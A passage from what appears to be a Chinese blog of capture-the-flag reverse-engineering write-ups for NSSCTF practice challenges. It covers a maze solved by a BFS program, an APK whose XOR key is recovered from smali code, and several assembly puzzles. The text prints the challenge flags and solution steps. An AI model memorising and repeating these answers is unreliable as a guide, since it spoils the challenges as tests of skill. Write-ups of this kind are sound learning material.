class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; map2[i];</span><br><span class="line">        <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​然后就手动对着16x16的地图走一遍吧,懒得再整代码之类的了(太麻烦了吧)—更新:代码已整(见结尾部分↓)</p><p>​整理出来某段该死的路径(眼睛快瞎了):</p><p>​wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd</p><p>​在线md5出来:a8622109e2fb1296e06d5eed6f78f954</p><p>​记得外面是NSSCTF{}  <s>nnd试了半天才知道是这个格式才对,就不能说清楚</s></p><p>​flag: NSSCTF{a8622109e2fb1296e06d5eed6f78f954}</p><p>更新:走迷宫代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> map[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">&#125; pre[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> vis[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> destination;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    queue&lt;<span class="keyword">struct</span> R&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">    pre[x][y] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    vis[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">R</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (map[now.x][now.y] == <span class="number">-1</span>) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            destination = now;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x1 = now.x + dx[i];</span><br><span class="line">            <span class="type">int</span> y1 = now.y + dy[i];</span><br><span class="line">            <span class="keyword">if</span> (x1 &gt;= <span class="number">0</span> &amp;&amp; x1 &lt;= <span class="number">15</span> &amp;&amp; y1 &gt;= <span class="number">0</span> &amp;&amp; y1 &lt;= <span class="number">15</span> &amp;&amp; !vis[x1][y1] &amp;&amp; map[x1][y1] != <span class="number">1</span>) &#123;</span><br><span class="line">                vis[x1][y1] = <span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;x1, y1&#125;);</span><br><span class="line">                pre[x1][y1] = now;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_route</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">R</span> now = destination;</span><br><span class="line">    vector&lt;<span class="type">char</span>&gt; route;</span><br><span class="line">    <span class="keyword">while</span> (!(pre[now.x][now.y].x == <span class="number">-1</span> &amp;&amp; pre[now.x][now.y].y == <span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="type">int</span> sub_x = now.x - pre[now.x][now.y].x;</span><br><span class="line">        <span class="type">int</span> sub_y = now.y - pre[now.x][now.y].y;</span><br><span class="line">        <span class="keyword">if</span> (sub_x &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_x &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        now=pre[now.x][now.y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(route.<span class="built_in">begin</span>(), route.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i: route)</span><br><span class="line">        cout &lt;&lt; i;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">bfs</span>(<span class="number">15</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print_route</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​结束…</p><h2 id="easyapp">easyapp</h2><p>​附件还挺花…没有zip后缀…</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728182839055.png" alt="image-20230728182839055" style="zoom:33%;" /></p><p>​加上然后解压出来个apk…继续整吧,不会java是真的麻烦…</p><p>​又是smail…看来得学学这玩意…</p><h3 id="第一部分-encoder类">第一部分—encoder类</h3><p>​总之就是分析代码…首先发现main中对输入的字符串进行了encode方法的调用,也就是所我们先要去查看encoder类:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200832325.png" alt="image-20230728200832325" style="zoom:50%;" /></p><p>​这里有个key的field(别问我这是什么…我没学过java…貌似是某种数据段)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200946254.png" alt="image-20230728200946254" style="zoom:50%;" /></p><p>​而且赋初值为0x75bcd15,继续分析发现后续代码有一个逻辑上的映射变换</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728201437225.png" alt="image-20230728201437225" style="zoom:45%;" /></p><p>​这里是一个循环↑分析:</p><p>​53行:循环边界,判断v1是否大于0,是的话跳出</p><p>​55行:将p1的第v2个字符赋值给v3</p><p>​58行:获取key(p0是Encoder类)给v4</p><p>​60行:v3和v4异或(xor)</p><p>​61行:字面意思</p><p>​65行:append到字符串(v0?)</p><p>​67行:v2自增,准备进行下一次循环</p><p>​也就是说这里的字符串对key进行了异或映射</p><h3 id="第二部分-main继续分析">第二部分—main继续分析</h3><p>​为什么有两个MainActivity.smail…</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202551209.png" alt="image-20230728202551209" style="zoom:33%;" /></p><p>​所以这里对key进行了重新赋值…我实在看不懂这东西的运行顺序…看WP看的这么个意思…</p><p>​总之就是要把p2和这个key进行异或运算然后就能出flag,p2就是这个(这个一看就懂):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202753479.png" alt="image-20230728202753479" style="zoom:33%;" /></p><p>​那么我们另外写脚本吧,就用python吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">&quot;\u68ff\u68e2\u68e2\u68f2\u68e5\u68f7\u68ca\u68d0\u68c1\u68da\u68e8\u68e8\u68f5\u68e2\u68cc&quot;</span></span><br><span class="line">key = <span class="number">0x3ade68b1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) ^ key) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#因为extend ascii字符是0x0-0xFF 但是unicode肯定是越界的, 所以这里要和0xff进行与操作来把最后结果限制到0x0-0xff</span></span><br><span class="line"><span class="comment">#运行脚本得到flag</span></span><br></pre></td></tr></table></figure><p>​这里因为对py不熟悉所以还是看了题解QWQ</p><p>​NSSCTF{apkYYDS}</p><p>​结束…(相当于把大佬的WP抄了一遍…)</p><h2 id="asm1">asm1</h2><p>应该没有比我更闲的人了…这东西我还逆向出伪代码…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">asm1:</span><br><span class="line">&lt;+0&gt;:push   ebp              ; 将ebp寄存器的值保存到栈上</span><br><span class="line">&lt;+1&gt;:mov    ebp,esp         ; 将esp的值赋给ebp寄存器，建立新的栈帧</span><br><span class="line">&lt;+3&gt;:cmp    DWORD PTR [ebp+0x8],0x3a2   ; 比较ebp+0x8处的双字值与0x3a2</span><br><span class="line">&lt;+10&gt;:jg     0x512 &lt;asm1+37&gt;   ; 如果大于则跳转到地址0x512处继续执行</span><br><span class="line">&lt;+12&gt;:cmp    DWORD PTR [ebp+0x8],0x358   ; 否则，比较ebp+0x8处的双字值与0x358</span><br><span class="line">&lt;+19&gt;:jne    0x50a &lt;asm1+29&gt;   ; 如果不等于则跳转到地址0x50a处继续执行</span><br><span class="line">&lt;+21&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+24&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+27&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+29&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+32&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+35&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+37&gt;:cmp    DWORD PTR [ebp+0x8],0x6fa   ; 比较ebp+0x8处的双字值与0x6fa</span><br><span class="line">&lt;+44&gt;:jne    0x523 &lt;asm1+54&gt;   ; 如果不等于则跳转到地址0x523处继续执行</span><br><span class="line">&lt;+46&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+49&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+52&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+54&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+57&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+60&gt;:pop    ebp              ; 恢复栈帧，将栈顶指针赋给ebp寄存器</span><br><span class="line">&lt;+61&gt;:ret                    ; 返回</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来伪代码分析:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> &amp;k = [ebp+<span class="number">0x8</span>] <span class="comment">//写了个引用代表这个内存了哈哈哈</span></span><br><span class="line"><span class="keyword">if</span>(k&gt;<span class="number">0x3a2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(k!=<span class="number">0x6fa</span>)&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax+=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax-=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(k!=<span class="number">0x358</span>)&#123;</span><br><span class="line">    ax=k</span><br><span class="line">    ax-=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ax=p</span><br><span class="line">    ax+=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注意返回值就是eax</span></span><br></pre></td></tr></table></figure><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731233248628.png" alt="image-20230731233248628" style="zoom:33%;" /></p><p>貌似是动态flag,我这里是0x6fa,所以结果就是0x6fa-0x12==0x6e8</p><p>结束…</p><h2 id="asm2">asm2</h2><p>也是看代码,这个题就是一个循环:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235735960.png" alt="image-20230731235735960"></p><p>写解密代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0x21</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">0x2</span>;</span><br><span class="line">    <span class="keyword">while</span>(b&lt;=<span class="number">0xfb46</span>)&#123;</span><br><span class="line">        a+=<span class="number">1</span>;</span><br><span class="line">        b+=<span class="number">0x74</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#x&quot;</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235633534.png" alt="image-20230731235633534" style="zoom:33%;" /></p><p>结束…</p><h2 id="asm3">asm3</h2><p>这道题试试用c调用汇编函数,首先在win下编译失败…</p><h3 id="ubuntu下编译环境的搭建">ubuntu下编译环境的搭建</h3><p>然后转到ubuntu,在编译时报了一个错:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091451315.png" alt="image-20230801091451315" style="zoom:33%;" /><p>百度后了解到是在x86_64直接编译32位程序报错,需要安装multilib库:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091609808.png" alt="image-20230801091609808" style="zoom:33%;" /><p>真就是配环境配了半天…又得更新包索引…</p><h3 id="代码修改">代码修改</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101549684.png" alt="image-20230801101549684" style="zoom:45%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101514580.png" alt="image-20230801101514580" style="zoom:50%;" /><h3 id="运行结果">运行结果</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101445107.png" alt="image-20230801101445107"></p><p>有一说一,没懂明白全为0的寄存器如何运行sub指令,不知道是我看的不对还是咋的</p><p>代码就是多了几个AL,AH寄存器而已(但是我不会算…字节位置有点没弄明白)</p><p>x86平台(即32位平台)的EAX占32位(4字节),EAX的低16位是AX,AX的低8位是AL,AX的高8位是AH</p><p>但是算起来内存没弄明白…</p><p>暂时结束…</p><h2 id="reverse-cipher">reverse_cipher</h2><p>这题简单,直接拖IDA看,逆向分析逻辑就行,就是最后那个}字符不知道咋的IDA逆向出v11=v5…v5前面都没有初始化…不过不影响…手动putchar(str[23]);就行</p><p>直接在IDA逆向出的代码中加注释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 